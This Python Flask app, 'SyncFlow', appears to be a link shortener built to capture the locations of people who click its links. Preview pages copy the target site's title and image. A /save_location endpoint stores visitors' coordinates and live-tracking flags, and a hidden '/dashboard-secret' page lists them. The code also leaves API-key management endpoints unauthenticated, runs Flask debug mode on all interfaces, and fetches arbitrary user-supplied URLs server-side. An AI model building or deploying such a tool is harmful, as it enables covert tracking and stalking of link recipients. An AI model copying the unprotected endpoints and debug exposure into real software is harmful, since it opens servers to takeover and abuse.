from flask import Flask, render_template, request, redirect, jsonify, abort
from flask_cors import CORS
import sqlite3
import secrets
import string
from urllib.parse import urlparse, quote
import requests
from bs4 import BeautifulSoup
import threading
import re
from datetime import datetime, timedelta
import hashlib
from functools import wraps

app = Flask(__name__)
CORS(app)

# Database setup
def get_db():
    conn = sqlite3.connect('syncflow.db')
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        # Links table with expiration
        conn.execute('''
            CREATE TABLE IF NOT EXISTS links (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                code TEXT UNIQUE NOT NULL,
                original_url TEXT NOT NULL,
                title TEXT,
                image TEXT,
                description TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                expires_at TIMESTAMP
            )
        ''')
        
        # Add expires_at column if it doesn't exist (for existing databases)
        try:
            conn.execute('ALTER TABLE links ADD COLUMN expires_at TIMESTAMP')
        except sqlite3.OperationalError:
            pass  # Column already exists
        
        # Clicks table
        conn.execute('''
            CREATE TABLE IF NOT EXISTS clicks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                link_code TEXT NOT NULL,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Locations table
        conn.execute('''
            CREATE TABLE IF NOT EXISTS locations (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                link_code TEXT NOT NULL,
                latitude REAL NOT NULL,
                longitude REAL NOT NULL,
                is_live BOOLEAN DEFAULT 0,
                accuracy REAL,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # API Keys table
        conn.execute('''
            CREATE TABLE IF NOT EXISTS api_keys (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                key_hash TEXT NOT NULL,
                prefix TEXT NOT NULL,
                project_name TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_active BOOLEAN DEFAULT 1,
                request_count INTEGER DEFAULT 0,
                last_used_at TIMESTAMP
            )
        ''')
        
        # Add project_name column if it doesn't exist
        try:
            conn.execute('ALTER TABLE api_keys ADD COLUMN project_name TEXT')
        except sqlite3.OperationalError:
            pass
        
        # Add request_count and last_used_at columns if they don't exist
        try:
            conn.execute('ALTER TABLE api_keys ADD COLUMN request_count INTEGER DEFAULT 0')
        except sqlite3.OperationalError:
            pass
        
        try:
            conn.execute('ALTER TABLE api_keys ADD COLUMN last_used_at TIMESTAMP')
        except sqlite3.OperationalError:
            pass
        
        conn.commit()

def hash_api_key(api_key):
    """Hash an API key using SHA256"""
    return hashlib.sha256(api_key.encode()).hexdigest()

def generate_api_key():
    """Generate a new API key in format: sk_live_<random_string>"""
    random_part = secrets.token_urlsafe(32)
    return f"sk_live_{random_part}"

def validate_api_key(api_key):
    """Validate an API key and update usage stats"""
    if not api_key:
        return False
    
    key_hash = hash_api_key(api_key)
    
    with get_db() as conn:
        key_record = conn.execute(
            'SELECT id, is_active FROM api_keys WHERE key_hash = ?',
            (key_hash,)
        ).fetchone()
        
        if key_record and key_record['is_active']:
            # Update usage stats
            conn.execute(
                'UPDATE api_keys SET request_count = request_count + 1, last_used_at = CURRENT_TIMESTAMP WHERE id = ?',
                (key_record['id'],)
            )
            conn.commit()
            return True
    
    return False

def require_api_key(f):
    """Decorator to require API key authentication"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        auth_header = request.headers.get('Authorization', '')
        
        if not auth_header.startswith('Bearer '):
            return jsonify({'error': 'Invalid authorization header. Use: Bearer <api_key>'}), 401
        
        api_key = auth_header[7:]  # Remove 'Bearer ' prefix
        
        if not validate_api_key(api_key):
            return jsonify({'error': 'Invalid or inactive API key'}), 401
        
        return f(*args, **kwargs)
    return decorated_function

def extract_domain(url):
    try:
        parsed = urlparse(url)
        domain = parsed.netloc or parsed.path
        domain = domain.replace('www.', '')
        domain_parts = domain.split('.')
        if len(domain_parts) >= 2:
            domain = domain_parts[-2]
        return domain.lower()
    except:
        return "link"

def generate_code(length=7):
    alphabet = string.ascii_lowercase + string.digits
    return ''.join(secrets.choice(alphabet) for _ in range(length))

def fetch_metadata(url):
    """Fetch metadata from URL with timeout protection"""
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        # Reduced timeout to 3 seconds to prevent hanging
        response = requests.get(url, timeout=3, headers=headers, verify=True)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        
        title = None
        og_title = soup.find('meta', property='og:title')
        if og_title and og_title.get('content'):
            title = og_title['content'][:200]
        else:
            title_tag = soup.find('title')
            if title_tag:
                title = title_tag.get_text(strip=True)[:200]
        
        image = None
        og_image = soup.find('meta', property='og:image')
        if og_image and og_image.get('content'):
            image = og_image['content']
        
        description = None
        og_desc = soup.find('meta', property='og:description')
        if og_desc and og_desc.get('content'):
            description = og_desc['content'][:300]
        else:
            meta_desc = soup.find('meta', attrs={'name': 'description'})
            if meta_desc and meta_desc.get('content'):
                description = meta_desc['content'][:300]
        
        if not title:
            title = urlparse(url).netloc or "Website Link"
            
        return title, image, description
    except requests.Timeout:
        print(f"Timeout fetching metadata for {url}")
        return urlparse(url).netloc or "Website Link", None, "Preview not available (timeout)"
    except Exception as e:
        print(f"Error fetching metadata: {e}")
        return urlparse(url).netloc or "Website Link", None, "Preview not available"

@app.route('/')
def index():
    # Clean up expired links on home page load
    cleanup_expired_links()
    return render_template('index.html')

@app.route('/generate', methods=['POST'])
def generate():
    try:
        data = request.get_json()
        original_url = data.get('url', '').strip()
        
        if not original_url:
            return jsonify({'error': 'URL is required'}), 400
        
        if not original_url.startswith(('http://', 'https://')):
            original_url = 'https://' + original_url
        
        domain = extract_domain(original_url)
        code = generate_code()
        slug = f"{domain}-{code}"
        
        # Set expiration date (24 hours from now)
        expires_at = datetime.now() + timedelta(hours=24)
        
        # Insert with placeholder metadata first (fast response)
        with get_db() as conn:
            conn.execute(
                'INSERT INTO links (code, original_url, title, image, description, expires_at) VALUES (?, ?, ?, ?, ?, ?)',
                (code, original_url, "Loading preview...", None, "Fetching metadata...", expires_at)
            )
            conn.commit()
        
        # Fetch metadata in background to not block the response
        def fetch_and_update():
            try:
                title, image, description = fetch_metadata(original_url)
                with get_db() as conn:
                    conn.execute(
                        'UPDATE links SET title = ?, image = ?, description = ? WHERE code = ?',
                        (title, image, description, code)
                    )
                    conn.commit()
                print(f"Metadata updated for {code}: {title}")
            except Exception as e:
                print(f"Background metadata fetch failed: {e}")
        
        # Start background thread
        thread = threading.Thread(target=fetch_and_update, daemon=True)
        thread.start()
        
        return jsonify({
            'success': True,
            'slug': slug
        })
    except Exception as e:
        print(f"Generate endpoint error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/generate-api-key', methods=['POST'])
def generate_api_key_endpoint():
    """Generate a new API key (protected by session, but open for dashboard)"""
    try:
        data = request.get_json()
        project_name = data.get('project_name', '').strip()
        
        if not project_name:
            return jsonify({'error': 'Project name is required'}), 400
        
        # Generate new API key
        api_key = generate_api_key()
        key_hash = hash_api_key(api_key)
        prefix = api_key[:15]  # Store first 15 chars as prefix for display
        
        with get_db() as conn:
            conn.execute(
                'INSERT INTO api_keys (key_hash, prefix, project_name) VALUES (?, ?, ?)',
                (key_hash, prefix, project_name)
            )
            conn.commit()
        
        # Return the full key (only shown once)
        return jsonify({
            'success': True,
            'api_key': api_key,
            'prefix': prefix,
            'project_name': project_name,
            'message': 'API key generated successfully. Make sure to copy it now - it won\'t be shown again!'
        })
    except Exception as e:
        print(f"Generate API key error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/list-api-keys', methods=['GET'])
def list_api_keys():
    """List all API keys (masked)"""
    try:
        with get_db() as conn:
            keys = conn.execute('''
                SELECT id, prefix, project_name, created_at, is_active, request_count, last_used_at 
                FROM api_keys 
                ORDER BY created_at DESC
            ''').fetchall()
        
        return jsonify({
            'success': True,
            'keys': [dict(key) for key in keys]
        })
    except Exception as e:
        print(f"List API keys error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/update-api-key/<int:key_id>', methods=['PUT'])
def update_api_key(key_id):
    """Update API key project name"""
    try:
        data = request.get_json()
        project_name = data.get('project_name', '').strip()
        
        if not project_name:
            return jsonify({'error': 'Project name is required'}), 400
        
        with get_db() as conn:
            # Check if key exists
            key = conn.execute('SELECT id FROM api_keys WHERE id = ?', (key_id,)).fetchone()
            if not key:
                return jsonify({'error': 'API key not found'}), 404
            
            # Update project name
            conn.execute(
                'UPDATE api_keys SET project_name = ? WHERE id = ?',
                (project_name, key_id)
            )
            conn.commit()
        
        return jsonify({
            'success': True,
            'message': 'API key updated successfully'
        })
    except Exception as e:
        print(f"Update API key error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/revoke-api-key/<int:key_id>', methods=['DELETE'])
def revoke_api_key(key_id):
    """Revoke an API key (set is_active = 0)"""
    try:
        with get_db() as conn:
            result = conn.execute(
                'UPDATE api_keys SET is_active = 0 WHERE id = ?',
                (key_id,)
            )
            conn.commit()
            
            if result.rowcount == 0:
                return jsonify({'error': 'API key not found'}), 404
        
        return jsonify({
            'success': True,
            'message': 'API key revoked successfully'
        })
    except Exception as e:
        print(f"Revoke API key error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/delete-api-key/<int:key_id>', methods=['DELETE'])
def delete_api_key(key_id):
    """Permanently delete an API key"""
    try:
        with get_db() as conn:
            # Check if key exists
            key = conn.execute('SELECT id FROM api_keys WHERE id = ?', (key_id,)).fetchone()
            if not key:
                return jsonify({'error': 'API key not found'}), 404
            
            # Delete the key permanently
            conn.execute('DELETE FROM api_keys WHERE id = ?', (key_id,))
            conn.commit()
        
        return jsonify({
            'success': True,
            'message': 'API key deleted permanently'
        })
    except Exception as e:
        print(f"Delete API key error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/get-api-key-prefix/<int:key_id>', methods=['GET'])
def get_api_key_prefix(key_id):
    """Get API key prefix for display in edit modal"""
    try:
        with get_db() as conn:
            key = conn.execute(
                'SELECT prefix, project_name FROM api_keys WHERE id = ?',
                (key_id,)
            ).fetchone()
            
            if not key:
                return jsonify({'error': 'API key not found'}), 404
            
            return jsonify({
                'success': True,
                'prefix': key['prefix'],
                'project_name': key['project_name']
            })
    except Exception as e:
        print(f"Get API key prefix error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/shorten', methods=['POST'])
@require_api_key
def api_shorten():
    """API endpoint to create short links (requires API key)"""
    try:
        data = request.get_json()
        original_url = data.get('url', '').strip()
        
        if not original_url:
            return jsonify({'error': 'URL is required'}), 400
        
        if not original_url.startswith(('http://', 'https://')):
            original_url = 'https://' + original_url
        
        domain = extract_domain(original_url)
        code = generate_code()
        slug = f"{domain}-{code}"
        
        # Set expiration date (24 hours from now)
        expires_at = datetime.now() + timedelta(hours=24)
        
        # Insert with placeholder metadata
        with get_db() as conn:
            conn.execute(
                'INSERT INTO links (code, original_url, title, image, description, expires_at) VALUES (?, ?, ?, ?, ?, ?)',
                (code, original_url, "Loading preview...", None, "Fetching metadata...", expires_at)
            )
            conn.commit()
        
        # Fetch metadata in background
        def fetch_and_update():
            try:
                title, image, description = fetch_metadata(original_url)
                with get_db() as conn:
                    conn.execute(
                        'UPDATE links SET title = ?, image = ?, description = ? WHERE code = ?',
                        (title, image, description, code)
                    )
                    conn.commit()
            except Exception as e:
                print(f"Background metadata fetch failed: {e}")
        
        thread = threading.Thread(target=fetch_and_update, daemon=True)
        thread.start()
        
        return jsonify({
            'success': True,
            'short_url': f"{request.host_url}{slug}",
            'code': code,
            'slug': slug
        })
    except Exception as e:
        print(f"API shorten endpoint error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/<slug>')
def preview(slug):
    parts = slug.split('-')
    if len(parts) < 2:
        abort(404)
    code = parts[-1]
    
    with get_db() as conn:
        link = conn.execute('SELECT * FROM links WHERE code = ?', (code,)).fetchone()
    
    if not link:
        abort(404)
    
    # Check if link is expired
    if link['expires_at']:
        expires_at = datetime.strptime(link['expires_at'], '%Y-%m-%d %H:%M:%S')
        if datetime.now() > expires_at:
            return render_template('expired.html', code=code)
    
    return render_template('preview.html', link=link, slug=slug)

@app.route('/go/<code>')
def redirect_to_url(code):
    with get_db() as conn:
        # Check if link exists and is not expired
        link = conn.execute('SELECT original_url, expires_at FROM links WHERE code = ?', (code,)).fetchone()
    
    if not link:
        abort(404)
    
    # Check expiration
    if link['expires_at']:
        expires_at = datetime.strptime(link['expires_at'], '%Y-%m-%d %H:%M:%S')
        if datetime.now() > expires_at:
            return render_template('expired.html', code=code), 410
    
    with get_db() as conn:
        conn.execute('INSERT INTO clicks (link_code) VALUES (?)', (code,))
        conn.commit()
    
    original_url = link['original_url']
    
    # Convert OpenStreetMap URLs to Google Maps
    if 'openstreetmap.org' in original_url or 'osm.org' in original_url:
        parsed = urlparse(original_url)
        lat = None
        lon = None
        
        # Check for #map=zoom/lat/lon format
        if parsed.fragment and 'map=' in parsed.fragment:
            fragment = parsed.fragment
            match = re.search(r'map=(\d+)/([-\d.]+)/([-\d.]+)', fragment)
            if match:
                lat = match.group(2)
                lon = match.group(3)
        
        # Check for query parameters
        if not lat and parsed.query:
            from urllib.parse import parse_qs
            params = parse_qs(parsed.query)
            if 'lat' in params and 'lon' in params:
                lat = params['lat'][0]
                lon = params['lon'][0]
        
        # If coordinates found, redirect to Google Maps
        if lat and lon:
            google_maps_url = f'https://www.google.com/maps?q={lat},{lon}'
            return redirect(google_maps_url)
        
        # If no coordinates found, search the URL on Google Maps
        google_maps_url = f'https://www.google.com/maps/search/{quote(original_url)}'
        return redirect(google_maps_url)
    
    # For any other URLs that might contain location data, extract coordinates
    # Pattern to match latitude/longitude in various formats
    coord_pattern = r'([-+]?\d{1,2}(?:\.\d+)?)[°\s]?[NS]?\s*[,\s]\s*([-+]?\d{1,3}(?:\.\d+)?)[°\s]?[EW]?'
    match = re.search(coord_pattern, original_url)
    
    if match:
        lat = match.group(1)
        lon = match.group(2)
        google_maps_url = f'https://www.google.com/maps?q={lat},{lon}'
        return redirect(google_maps_url)
    
    # Default: redirect to Google Maps with the URL as search query
    google_maps_url = f'https://www.google.com/maps/search/{quote(original_url)}'
    return redirect(google_maps_url)

@app.route('/save_location', methods=['POST'])
def save_location():
    try:
        data = request.get_json()
        link_code = data.get('link_code')
        latitude = data.get('latitude')
        longitude = data.get('longitude')
        is_live = data.get('is_live', False)
        accuracy = data.get('accuracy', None)
        
        if not link_code or latitude is None or longitude is None:
            return jsonify({'error': 'Missing required fields'}), 400
        
        with get_db() as conn:
            conn.execute(
                'INSERT INTO locations (link_code, latitude, longitude, is_live, accuracy) VALUES (?, ?, ?, ?, ?)',
                (link_code, latitude, longitude, is_live, accuracy)
            )
            conn.commit()
        
        return jsonify({'success': True})
    except Exception as e:
        print(f"Save location error: {e}")
        return jsonify({'error': str(e)}), 500

def cleanup_expired_links():
    """Delete expired links and associated data"""
    try:
        with get_db() as conn:
            # Get expired links
            expired_links = conn.execute(
                'SELECT code FROM links WHERE expires_at IS NOT NULL AND expires_at < ?',
                (datetime.now(),)
            ).fetchall()
            
            for link in expired_links:
                # Delete associated clicks
                conn.execute('DELETE FROM clicks WHERE link_code = ?', (link['code'],))
                # Delete associated locations
                conn.execute('DELETE FROM locations WHERE link_code = ?', (link['code'],))
                # Delete the link
                conn.execute('DELETE FROM links WHERE code = ?', (link['code'],))
            
            conn.commit()
            if expired_links:
                print(f"Cleaned up {len(expired_links)} expired links")
    except Exception as e:
        print(f"Cleanup error: {e}")

@app.route('/dashboard-secret')
def dashboard():
    # Clean up expired links
    cleanup_expired_links()
    
    with get_db() as conn:
        # Get current timestamp as string for comparison
        now_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # Get active links (not expired) - using string comparison
        active_links = conn.execute('''
            SELECT l.*, COUNT(DISTINCT c.id) as click_count,
                   (SELECT COUNT(*) FROM locations WHERE link_code = l.code) as location_count,
                   strftime('%s', expires_at) - strftime('%s', 'now') as seconds_remaining
            FROM links l
            LEFT JOIN clicks c ON l.code = c.link_code
            WHERE l.expires_at > ?
            GROUP BY l.id
            ORDER BY l.created_at DESC
        ''', (now_str,)).fetchall()
        
        # Get expired links - using string comparison
        expired_links = conn.execute('''
            SELECT l.*, COUNT(DISTINCT c.id) as click_count,
                   (SELECT COUNT(*) FROM locations WHERE link_code = l.code) as location_count
            FROM links l
            LEFT JOIN clicks c ON l.code = c.link_code
            WHERE l.expires_at <= ?
            GROUP BY l.id
            ORDER BY l.created_at DESC
        ''', (now_str,)).fetchall()
        
        # Get recent locations
        locations = conn.execute('''
            SELECT loc.*, l.original_url, l.title, l.expires_at
            FROM locations loc
            JOIN links l ON loc.link_code = l.code
            ORDER BY loc.timestamp DESC
            LIMIT 50
        ''').fetchall()
        
        # Get API keys for display
        api_keys = conn.execute('''
            SELECT id, prefix, project_name, created_at, is_active, request_count, last_used_at 
            FROM api_keys 
            ORDER BY created_at DESC
        ''').fetchall()
    
    return render_template('dashboard.html', 
                         active_links=active_links, 
                         expired_links=expired_links,
                         locations=locations,
                         api_keys=api_keys)

@app.route('/delete_link/<code>', methods=['DELETE'])
def delete_link(code):
    """Delete a specific link and all associated data"""
    try:
        with get_db() as conn:
            # Check if link exists
            link = conn.execute('SELECT code FROM links WHERE code = ?', (code,)).fetchone()
            if not link:
                return jsonify({'error': 'Link not found'}), 404
            
            # Delete associated clicks
            conn.execute('DELETE FROM clicks WHERE link_code = ?', (code,))
            # Delete associated locations
            conn.execute('DELETE FROM locations WHERE link_code = ?', (code,))
            # Delete the link
            conn.execute('DELETE FROM links WHERE code = ?', (code,))
            conn.commit()
        
        return jsonify({'success': True, 'message': f'Link {code} deleted successfully'})
    except Exception as e:
        print(f"Delete link error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/delete_location/<int:location_id>', methods=['DELETE'])
def delete_location(location_id):
    """Delete a specific location entry"""
    try:
        with get_db() as conn:
            conn.execute('DELETE FROM locations WHERE id = ?', (location_id,))
            conn.commit()
        
        return jsonify({'success': True, 'message': 'Location deleted successfully'})
    except Exception as e:
        print(f"Delete location error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/health')
def health():
    """Health check endpoint to verify server is running"""
    return jsonify({'status': 'ok', 'message': 'SyncFlow is running'})

if __name__ == '__main__':
    init_db()
    print("\n" + "="*50)
    print("SyncFlow is running!")
    print("="*50)
    print("Open this URL in your browser:")
    print("  -> http://127.0.0.1:5000")
    print("  -> http://localhost:5000")
    print("\nHealth check: http://127.0.0.1:5000/health")
    print("\nAPI Key System Available:")
    print("  -> Generate keys from dashboard")
    print("  -> Use API: POST /api/shorten with Authorization: Bearer <api_key>")
    print("="*50 + "\n")
    app.run(host='0.0.0.0', port=5000, debug=True, threaded=True)